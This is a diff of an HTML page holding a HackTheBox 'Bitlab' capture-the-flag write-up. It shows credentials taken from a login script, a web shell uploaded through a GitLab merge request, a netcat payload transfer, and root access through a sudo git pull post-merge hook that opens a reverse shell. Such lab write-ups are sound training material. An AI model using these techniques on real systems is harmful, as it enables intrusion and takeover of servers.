@@ -1,33 +1,4 @@
-<!DOCTYPE html>
-<html lang="en"><head>
-  <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>HackTheBox :: Bitlab</title><!-- Begin Jekyll SEO tag v2.7.1 -->
-<meta name="generator" content="Jekyll v4.2.0" />
-<meta property="og:title" content="HackTheBox :: Bitlab" />
-<meta property="og:locale" content="en_US" />
-<meta name="description" content="HackTheBox :: Bitlab" />
-<meta property="og:description" content="HackTheBox :: Bitlab" />
-<link rel="canonical" href="https://sradley.github.io/writeups/2020/12/25/htb-bitlab.html" />
-<meta property="og:url" content="https://sradley.github.io/writeups/2020/12/25/htb-bitlab.html" />
-<meta property="og:site_name" content="sradley" />
-<meta property="og:type" content="article" />
-<meta property="article:published_time" content="2020-12-25T00:00:00+08:00" />
-<meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="HackTheBox :: Bitlab" />
-<script type="application/ld+json">
-{"description":"HackTheBox :: Bitlab","mainEntityOfPage":{"@type":"WebPage","@id":"https://sradley.github.io/writeups/2020/12/25/htb-bitlab.html"},"url":"https://sradley.github.io/writeups/2020/12/25/htb-bitlab.html","@type":"BlogPosting","headline":"HackTheBox :: Bitlab","dateModified":"2020-12-25T00:00:00+08:00","datePublished":"2020-12-25T00:00:00+08:00","@context":"https://schema.org"}</script>
-<!-- End Jekyll SEO tag -->
-<link rel="stylesheet" type="text/css" href="/assets/main-dark.css"></head>
-<body>
-    <div class="container"><header>
-  <div class="menu">
-    <ul><li><a href="/">/</a></li><li><a href="/about/">/about</a></li><li><a href="/contact.html">/contact</a></li></ul>
-  </div>
-</header>
-<main>
-      <h1 id="hackthebox--bitlab">HackTheBox :: Bitlab</h1>
+I")<<h1 id="hackthebox--bitlab">HackTheBox :: Bitlab</h1>
 
 <h2 id="initial-enumeration">Initial Enumeration</h2>
 <p>Let’s start with our usual nmap scan.</p>
@@ -93,7 +64,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </code></pre></div></div>
 <p><br /></p>
 
-<p>Nice. It’s pretty obvious this is some sort of hacky login script that this dude “clave” wrote. Let’s cut out all the crap so the javascript is readable (an unnecessary step, but indulge me).</p>
+<p>Nice. It’s pretty obvious this is some sort of hacky login script that this dude “clave” wrote.
+Let’s cut out all the crap so the javascript is readable (an unnecessary step, but indulge me).</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function() {
     document.getElementById("user_login").value = "clave";
     document.getElementById("user_password").value = "11des0081x";
@@ -101,15 +73,24 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </code></pre></div></div>
 <p><br /></p>
 
-<p>Awesome, now that we have some credentials we should use them. They’re definitely for the gitlab login page. Let’s give them a go and see what we can see.</p>
+<p>Awesome, now that we have some credentials we should use them. They’re definitely for the gitlab
+login page. Let’s give them a go and see what we can see.</p>
 
-<p>Okay, so it seems like “clave” has access to two repositories, “Profile” and “Deployer”. Let’s give both of these a good read (commits, issues, pull requests, source code, etc) and see if we can’t find anything interesting.</p>
+<p>Okay, so it seems like “clave” has access to two repositories, “Profile” and “Deployer”. Let’s
+give both of these a good read (commits, issues, pull requests, source code, etc) and see if we
+can’t find anything interesting.</p>
 
-<p>So “Profile” is completely uninteresting apart from the fact that it has “Auto DevOps” enabled. “Deployer” is very interesting. It seems to be a git hook for the “Profile” repo. It looks like whenever a successful merge request goes through on “Profile”, the updated “Profile” repo is pulled onto the server. So I think our first step should be finding where the profile page is located on the server. What’s the bet that it’s just at “/profile”?</p>
+<p>So “Profile” is completely uninteresting apart from the fact that it has “Auto DevOps” enabled.
+“Deployer” is very interesting. It seems to be a git hook for the “Profile” repo. It looks like
+whenever a successful merge request goes through on “Profile”, the updated “Profile” repo is pulled
+onto the server. So I think our first step should be finding where the profile page is located on
+the server. What’s the bet that it’s just at “/profile”?</p>
 
-<p>Yup, that worked. Let’s see if can get a shell uploaded. It should be as simple as uploading the shell to another branch on the “Profile” repo and submitting a merge request. Let’s give this a go.</p>
+<p>Yup, that worked. Let’s see if can get a shell uploaded. It should be as simple as uploading the
+shell to another branch on the “Profile” repo and submitting a merge request. Let’s give this a go.</p>
 
-<p>Shell successfully uploaded, merge request successful. Hopefully we should be able to see our shell in the profile directory. Yup, there it is.</p>
+<p>Shell successfully uploaded, merge request successful. Hopefully we should be able to see our shell
+in the profile directory. Yup, there it is.</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p0wny@shell:…/html/profile# whoami
 www-data
 </code></pre></div></div>
@@ -140,7 +121,9 @@ User www-data may run the following commands on bitlab:
 </code></pre></div></div>
 <p><br /></p>
 
-<p>Huh, so it seems we can use <code class="language-plaintext highlighter-rouge">git pull</code> as sudo. We can leverage this, but it’ll be a little weird. I hope you’re familiar with git. I don’t want to go into too much detail as to how this exploit works, but I’ll give you an overview.</p>
+<p>Huh, so it seems we can use <code class="language-plaintext highlighter-rouge">git pull</code> as sudo. We can leverage this, but it’ll be a little weird.
+I hope you’re familiar with git. I don’t want to go into too much detail as to how this exploit works,
+but I’ll give you an overview.</p>
 <ol>
   <li>You need to create two repositories: one is the remote (the “master”) repository, and one is the “local” repository.</li>
   <li>You set the remote of the “local” repo to be the “master” repo you created earlier.</li>
@@ -148,9 +131,8 @@ User www-data may run the following commands on bitlab:
   <li>You can create a file “local/.git/hooks/post-merge”, that gets executed when you <code class="language-plaintext highlighter-rouge">git pull</code>.</li>
 </ol>
 
-<p><br /></p>
-
-<p>In the example <code class="language-plaintext highlighter-rouge">payload.tar</code>, the script that gets executed is a reverse shell. You can look throught the provided files to get a feel for it.</p>
+<p>In the example <code class="language-plaintext highlighter-rouge">payload.tar</code>, the script that gets executed is a reverse shell. You can look
+throught the provided files to get a feel for it.</p>
 
 <p>We upload our payload to the server using netcat.</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p0wny@shell:/tmp# nc 10.10.xx.xx 4444 &gt; payload.tar
@@ -161,7 +143,8 @@ connect to [10.10.xx.xx] from bitlab.htb [10.10.10.114] 49978
 </code></pre></div></div>
 <p><br /></p>
 
-<p>Next we unpack it and execute <code class="language-plaintext highlighter-rouge">sudo git pull</code>. Remember we have to have netcat running on our end to receive the reverse shell.</p>
+<p>Next we unpack it and execute <code class="language-plaintext highlighter-rouge">sudo git pull</code>. Remember we have to have netcat running on our end
+to receive the reverse shell.</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p0wny@shell:/tmp# tar xf payload.tar
 p0wny@shell:/tmp# cd payload/payload
 p0wny@shell:…/payload/payload# sudo git pull
@@ -193,11 +176,4 @@ cat /root/root.txt
   <li>Always enumerate for directories (dirbuster would have found both the profile page and the open help directory, we got lucky).</li>
 </ul>
 
-
-
-    </main><footer>
-  <a href="https://github.com/sradley">github.com/sradley</a>
-</footer>
-</div>
-  </body>
-</html>
+:ET
